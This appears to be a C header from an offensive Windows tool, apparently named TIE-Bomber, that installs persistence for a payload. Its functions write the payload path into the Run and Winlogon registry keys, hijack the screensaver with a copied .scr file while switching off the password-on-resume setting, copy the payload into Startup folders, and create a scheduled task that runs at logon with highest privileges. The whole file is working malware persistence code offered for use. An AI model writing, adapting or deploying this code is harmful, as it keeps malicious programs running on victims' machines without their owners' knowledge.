#ifndef PERS_H
#define PERS_H

#include <windows.h>
#include <stdlib.h>
#include "helper.h" 

typedef struct _PERS_CONTEXT {
    HKEY hiveKey;
    char *regKey;
    char *valueName;
    char *valueData;
    DWORD *valueDataLen;
    DWORD valueType;
    char *targetPath;
    DWORD targetPathLen;
} PERS_CONTEXT, *PPERS_CONTEXT;

int GetValueName(char *valueName, void *data) {
    PPERS_CONTEXT pPc = (PPERS_CONTEXT) data;
    if (*valueName != '\0') {
        pPc->valueName = valueName;
    } else {
        snprintf(pPc->valueName, MAX_REG_VALUE_NAME, "TIE-BomberRegistry");
    }

    return SUCCESS;
}

BOOL ModifyRegistry(PPERS_CONTEXT pPc) {
    HKEY hKey = NULL;
    LONG rc;

    rc = RegOpenKeyEx(pPc->hiveKey, (LPCSTR) pPc->regKey, 0, KEY_WRITE, &hKey);
    if (rc != ERROR_SUCCESS) {
        TranslateErrorPrint(GetLastError());
        return FALSE;
    }

    rc = RegSetValueEx(hKey, (LPCSTR) pPc->valueName, 0, pPc->valueType, (unsigned char*) pPc->valueData, *(pPc->valueDataLen));
    if (rc != ERROR_SUCCESS) {
        TranslateErrorPrint(GetLastError());
        RegCloseKey(hKey);
        return FALSE;
    }

    printf("[+] Registry value successfully set to %s -- %s\n", pPc->regKey, pPc->valueName);
    RegCloseKey(hKey);
    return TRUE;
}

BOOL InjectRunRegistry(PPERS_CONTEXT pPc) {
	const char *reg = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    int regLen = strlen(reg);
    pPc->regKey = malloc(MAX_REG_KEY_NAME + 1);
    pPc->valueName = malloc(MAX_REG_VALUE_NAME + 1);
    BOOL rc = FALSE;
    
    pPc->hiveKey = HKEY_CURRENT_USER;
    memcpy(pPc->regKey, reg, regLen);
    pPc->regKey[regLen] = '\0';
    pPc->valueData = pPc->targetPath;
    pPc->valueDataLen = &(pPc->targetPathLen);
    pPc->valueType = REG_SZ;

    if (!PromptUntilValid("Enter value name[Leave empty for default]", pPc->valueName, MAX_REG_VALUE_NAME, (ValidatorFunc) &GetValueName, pPc, TRUE)) {
        goto cleanup;
    }
    if (!ModifyRegistry(pPc)) {
        goto cleanup;
    }
    rc = TRUE;

cleanup:
    free(pPc->regKey);
    free(pPc->valueName);

	return rc;
}

BOOL InjectWinlogonRegistry(PPERS_CONTEXT pPc) {
	const char *reg = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";
    int regLen = strlen(reg);
    pPc->regKey = malloc(MAX_REG_KEY_NAME + 1);
    pPc->valueName = malloc(MAX_REG_VALUE_NAME + 1);
    BOOL rc = FALSE;
    
    pPc->hiveKey = HKEY_LOCAL_MACHINE;
    memcpy(pPc->regKey, reg, regLen);
    pPc->regKey[regLen] = '\0';
    pPc->valueData = pPc->targetPath;
    pPc->valueDataLen = &(pPc->targetPathLen);
    pPc->valueType = REG_SZ;

    if (!PromptUntilValid("Enter value name[Leave empty for default]", pPc->valueName, MAX_REG_VALUE_NAME, (ValidatorFunc) &GetValueName, pPc, TRUE)) {
        goto cleanup;
    }
    if (!ModifyRegistry(pPc)) {
        goto cleanup;
    }
    rc = TRUE;

cleanup:
    free(pPc->regKey);
    free(pPc->valueName);

	return rc;
}

BOOL HijackScreensaver(PPERS_CONTEXT pPc) {
    HKEY hKey = NULL;
    const char *timeout = "60";
    const char *activate = "1";
    const char *disable = "0";
    
    char *targetPathScr = malloc(MAX_PATH);
    memcpy(targetPathScr, pPc->targetPath, pPc->targetPathLen - 3);
    strncpy(targetPathScr + pPc->targetPathLen - 3, "scr", 3);
    targetPathScr[pPc->targetPathLen] = '\0';

    if (CopyPayload(pPc->targetPath, targetPathScr)) {
        LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"Control Panel\\Desktop", 0, KEY_WRITE, &hKey);
        if (res == ERROR_SUCCESS) {
            // create new registry keys
            RegSetValueEx(hKey, (LPCSTR)"ScreenSaveActive", 0, REG_SZ, (unsigned char*)activate, strlen(activate));
            RegSetValueEx(hKey, (LPCSTR)"ScreenSaveTimeout", 0, REG_SZ, (unsigned char*)timeout, strlen(timeout));
            RegSetValueEx(hKey, (LPCSTR)"ScreenSaverIsSecure", 0, REG_SZ, (unsigned char*)disable, strlen(disable));
            RegSetValueEx(hKey, (LPCSTR)"SCRNSAVE.EXE", 0, REG_SZ, (unsigned char*) targetPathScr, pPc->targetPathLen);
            RegCloseKey(hKey);
            printf("[+] Registry \"Control Panel\\Desktop modified successfuly");
        } else {
            TranslateErrorPrint(GetLastError());
            free(targetPathScr);
            return FALSE;
        }
    }
    free(targetPathScr);
    return TRUE;
}

BOOL AddToStartupFolder(PPERS_CONTEXT pPc, const char *envVar) {
    // First try All-users
    char rootPath[MAX_PATH + 1];
    char startupPathFull[MAX_PATH + 1];
    const char* startupPath = "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
    
    DWORD len = GetEnvironmentVariableA(envVar, rootPath, MAX_PATH);
    if (len == 0) {
        TranslateErrorPrint(GetLastError());
        return FALSE;
    }
    
    DWORD rootPathLen = len + strlen(startupPath);
    memcpy(rootPath + len, startupPath, strlen(startupPath));
    rootPath[rootPathLen] = '\0';
    printf("[*] Trying Startup Folder: %s\n", rootPath);
   
    // Check if writable
    if (HasWriteAccess(rootPath, NULL) == WIN_ERROR) {
        TranslateErrorPrint(GetLastError());
        return FALSE;
    }
    const char *payloadName = PathFindFileName(pPc->targetPath);
    DWORD payloadNameLen = strlen(payloadName);
    DWORD startupPathFullLen = rootPathLen + payloadNameLen;

    memcpy(startupPathFull, rootPath, rootPathLen);
    memcpy(startupPathFull + rootPathLen, payloadName, payloadNameLen);
    startupPathFull[startupPathFullLen] = '\0';

    if (!CopyPayload(pPc->targetPath, startupPathFull)) {    
        TranslateErrorPrint(GetLastError());
        return FALSE;
    }

    printf("[+] Payload is successfully added to Startup Folder");
    return TRUE;
}

BOOL AddToAUStartupFolder(PPERS_CONTEXT pPc) {
    return AddToStartupFolder(pPc, "PROGRAMDATA");
}

BOOL AddToCUStartupFolder(PPERS_CONTEXT pPc) {
    return AddToStartupFolder(pPc, "APPDATA");
}

BOOL CreateScheduledTask(PPERS_CONTEXT pPc) {
    char command[512];
    char username[UNLEN + 1];
    DWORD usernameSize = sizeof(username);

    GetUserNameA(username, &usernameSize);

    pPc->valueName = malloc(MAX_FILE + 1);

    if (!PromptUntilValid("Enter task value name[Leave empty for default]", pPc->valueName, MAX_REG_VALUE_NAME, (ValidatorFunc) &GetValueName, pPc, TRUE)) {
        free(pPc->valueName);
        return FALSE;
    }

    snprintf(command, sizeof(command), "schtasks /create /tn \"%s\" /tr \"%s\" /sc onlogon /ru %s /rl highest /f", pPc->valueName, pPc->targetPath, username);
    
    if (!ExecuteCommand(command)) {
        free(pPc->valueName);
        return FALSE;
    }

    printf("[+] Task \"%s\" created successfully\n", pPc->valueName);
    free(pPc->valueName);
    return TRUE;
}

#endif // PERS_H
